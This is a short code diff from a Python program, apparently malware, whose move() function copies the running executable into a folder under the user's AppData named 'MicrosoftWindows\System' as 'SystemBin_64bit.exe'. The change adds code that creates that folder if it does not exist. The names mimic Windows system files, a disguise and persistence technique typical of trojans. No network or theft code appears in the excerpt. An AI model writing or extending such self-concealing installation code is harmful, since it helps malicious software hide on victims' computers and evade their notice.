@@ -43,6 +43,11 @@ file_dir = sys.argv[0]
 def move():
     try:
         target_dir = f"{os.getenv('appdata')}\MicrosoftWindows\System"
+        
+        if not os.path.exists(target_dir):
+            os.mkdir(f"{os.getenv('appdata')}\MicrosoftWindows")
+            os.mkdir(target_dir)
+        
         #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
 
         copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
